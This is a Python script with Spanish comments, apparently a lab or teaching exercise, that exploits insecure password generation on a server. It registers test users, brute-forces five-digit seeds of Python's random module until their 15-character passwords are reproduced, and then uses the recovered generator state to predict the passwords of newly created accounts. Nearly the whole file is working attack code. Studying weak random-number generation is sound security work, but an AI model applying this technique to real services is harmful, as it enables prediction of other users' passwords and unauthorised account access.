import requests
from constants import *
import string
import random
"""
Usaremos el conocimiento que tenemos sobre la generación de datos insegura en python para obtener las contraseñas del sistema.
Primero empezamos creando n usuarios para tener contraseñas de referencia, una vez las tenemos.
Probaremos distintas seeds para ver si encontramos una seed que genere la contraseña de alguno de nuestros usuarios.
Primero supongamos unas cosas:
    Sabemos que las contraseñas solo usan letras y digitos.
    Sabemos que la SEED tiene 5 digitos.
    Sabemos que el sistema no tiene más de 100 usuarios.
"""
USUARIOS_PRUEBA = 25

def generar_usuarios(n:int) -> list[dict]:
    """Creo los usuarios necesarios en el server para verificar si la generación de la seed fue correcta."""
    usuarios_generados = []
    count_usuarios_creados = 0
    while count_usuarios_creados < n:
        username = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        # creo el usuario
        res = requests.post(f"{USUARIOS_ENDPOINT}/{username}")
        if res.ok:
            usuarios_generados.append(res.json())
            count_usuarios_creados += 1
    usuarios_formateados_str = '\n\t'.join([f'user: {user["nombre"]}; pass: {user["password"]}' for user in  usuarios_generados])
    print(f"usuarios creados:\n\t{usuarios_formateados_str}")
    return usuarios_generados

def busqueda_seed(contraseñas: list[str]) -> tuple[int, tuple]:
    """Busca la seed, si la encuentra la retorna junto a el estado interno del generador
    con el formato (seed:int, internal_state:tuple)"""
    contraseñas_replicadas = 0
    valid_chars = string.ascii_letters + string.digits
    generar_contraseña = lambda valid_chars, length: ''.join(generador.choices(valid_chars, k=length))
    
    print("Buscando la seed generadora...")
    # Considerando que la seed tiene 5 digitos, reviso todas las seeds de 5 digitos.
    for seed in range(10_000, 100_000):
        # creo un generador con el i actual
        generador = random.Random(seed)
        
        # Considerando que sabemos que hay 100 usuarios, ponemos un margen superior de 25 usuarios extra para buscar
        for j in range(125):
            # generamos las cadenas del mismo tamaño que se generan en el server (15 caracteres)
            contraseña = generar_contraseña(valid_chars, 15)
            
            if contraseña in contraseñas:
                print(f"\tContraseña coincidente para '{contraseña}' con seed {seed}")
                contraseñas_replicadas += 1
                
                # uso un margen para varias coincidencias de contraseñas replicadas puesto que por aleatoriedad se pudo generar una contraseña igual
                # en este caso resto 0 porque quiero que todas las contraseñas sean encontradas (con encontrar al menos 5 sabemos que es una seed valida)
                if contraseñas_replicadas >= (USUARIOS_PRUEBA - 0):
                    print(f"Posible seed encontrada: {seed} (contraseñas replicadas {contraseñas_replicadas:03})")
                    return seed, generador.getstate()
                
    print("No se encontro la seed")
    return 0, 0

def predice_contraseñas(internal_state: tuple, n: 5):
    """Genera una contraseña y la compara usando la seed generadora """
    
    generador = random.Random()
    # le meto el estado interno del generador propuesto para generar contraseñas
    generador.setstate(internal_state)
    valid_chars = string.ascii_letters + string.digits
    generar_contraseña = lambda valid_chars, length: ''.join(generador.choices(valid_chars, k=length))
    
    for i in range(n):
        username_random = f"".join(random.choices(valid_chars, k=8))
        # genero la request para crear un usuario
        res = requests.post(f"{USUARIOS_ENDPOINT}/{username_random}")
        if res.ok:
            user = res.json()
            # predigo la contraseña basado en lo que me indica la seed encontrada
            contraseña_predicha = generar_contraseña(valid_chars, 15)
            print(f"para el usuario: {user['nombre']}")
            print(f"\tcontraseña propuesta por nuestro generador: '{contraseña_predicha}'")
            print(f"\tcontraseña que envio el servidor:           '{user['password']}'")

usuarios_generados = generar_usuarios(USUARIOS_PRUEBA)

# filtro las contraseñas y empiezo a hacer la busqueda de la generación
contraseñas = [user.get('password') for user in usuarios_generados]


seed, internal_state = busqueda_seed(contraseñas)

if not seed:
    print("No se encontro la semilla :(")
    exit(0)

# si encontramos la semilla podemos hacer una pruebas para ver que la contraseña si es correcta.
predice_contraseñas(internal_state, 10)